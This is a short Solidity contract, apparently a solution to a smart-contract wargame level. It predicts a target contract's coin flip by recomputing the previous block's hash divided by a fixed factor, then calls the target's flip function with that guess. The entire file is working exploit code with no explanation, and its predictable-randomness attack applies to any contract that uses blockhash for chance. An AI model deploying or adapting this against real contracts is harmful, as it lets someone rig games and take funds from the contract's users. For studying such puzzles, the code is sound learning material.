pragma solidity 0.8.15;

contract CoinFlipAttacker {
    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address target) public {
        bool guess = calculateGuess();
        target.call(abi.encodeWithSignature("flip(bool)", guess));
    }

    function calculateGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}